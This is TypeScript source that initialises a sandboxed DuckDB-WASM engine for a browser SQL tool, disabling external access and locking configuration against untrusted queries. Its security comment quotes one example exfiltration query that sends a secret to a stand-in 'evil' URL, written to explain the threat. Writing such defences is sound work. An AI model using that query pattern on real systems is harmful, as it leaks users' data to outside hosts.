import * as duckdb from '@duckdb/duckdb-wasm'
// Self-hosted engine: Vite emits these as static assets, so nothing loads from a CDN.
// Only the "eh" (wasm exceptions) build is shipped; every current browser supports it.
import ehModuleUrl from '@duckdb/duckdb-wasm/dist/duckdb-eh.wasm?url'
import ehWorkerUrl from '@duckdb/duckdb-wasm/dist/duckdb-browser-eh.worker.js?url'

export interface Engine {
  db: duckdb.AsyncDuckDB
  conn: duckdb.AsyncDuckDBConnection
  /** Extensions that loaded from this site before the sandbox was sealed. */
  extensions: { parquet: boolean; json: boolean }
  /** True once SQL can no longer reach the network or anything outside SANDBOX_DIR. */
  sealed: boolean
}

/** Every file Quarry hands to DuckDB (opened files, sheets, exports) lives under this virtual folder. */
export const SANDBOX_DIR = '/quarry/'

/** Builds a safe virtual path inside the sandbox folder for a user-supplied name. */
export const sandboxPath = (name: string) => `${SANDBOX_DIR}${name.replace(/[^A-Za-z0-9._-]+/g, '_').replace(/\.{2,}/g, '_')}`

let enginePromise: Promise<Engine> | null = null

/*
 * Security model: user SQL is untrusted (people paste queries from the internet). DuckDB can read
 * URLs, so a query could otherwise leak data in a request like read_csv('https://evil/?d=' || secret).
 * Before the engine is handed to the app we:
 *   1. load the extensions we need from this site (no remote fallback),
 *   2. allow file access only under SANDBOX_DIR and switch off all other external access,
 *   3. lock the configuration so SQL can't switch any of it back on.
 * The page's Content-Security-Policy (vercel.json) blocks other origins as a second, independent layer.
 */
export function getEngine(): Promise<Engine> {
  enginePromise ??= (async () => {
    const worker = new Worker(ehWorkerUrl)
    const db = new duckdb.AsyncDuckDB(new duckdb.VoidLogger(), worker)
    await db.instantiate(ehModuleUrl)
    // Keep BIGINT as BigInt in Arrow results (exact values; needed for lossless table snapshots).
    await db.open({ query: { castBigIntToDouble: false, castTimestampToDate: false } })
    const conn = await db.connect()
    await conn.query(`SET autoinstall_known_extensions = false; SET autoload_known_extensions = false;`)

    const repo = new URL(`${import.meta.env.BASE_URL}duckdb-extensions`, location.href).href.replace(/\/$/, '')
    const load = async (name: 'parquet' | 'json') => {
      try {
        await conn.query(`INSTALL ${name} FROM '${repo}'`)
        await conn.query(`LOAD ${name}`)
        return true
      } catch {
        return false // not bundled in this build (e.g. dev server); the UI explains when it's needed
      }
    }
    const [parquet, json] = await Promise.all([load('parquet'), load('json')])

    await conn.query(`SET allowed_directories = ['${SANDBOX_DIR}']`)
    await conn.query(`SET enable_external_access = false`)
    await conn.query(`SET lock_configuration = true`)

    return { db, conn, extensions: { parquet, json }, sealed: true }
  })()
  return enginePromise
}

/** Throws a friendly error if a format's extension isn't available in this build. */
export async function ensureExtension(name: 'parquet' | 'json'): Promise<void> {
  const { extensions } = await getEngine()
  if (extensions[name]) return
  throw new Error(
    `${name === 'parquet' ? 'Parquet' : 'JSON'} support isn’t included in this build. Quarry only runs code served from its own site, so it won’t fetch it from elsewhere. CSV and Excel files work.`,
  )
}

export const quoteIdent = (name: string) => `"${name.replace(/"/g, '""')}"`
export const quoteLiteral = (value: string) => `'${value.replace(/'/g, "''")}'`

/** Rows of a small query as plain objects (for metadata, stats, aggregates). */
export async function queryObjects<T = Record<string, unknown>>(sql: string): Promise<T[]> {
  const { conn } = await getEngine()
  const table = await conn.query(sql)
  return table.toArray().map((row) => row.toJSON() as T)
}

export async function exec(sql: string): Promise<void> {
  const { conn } = await getEngine()
  await conn.query(sql)
}
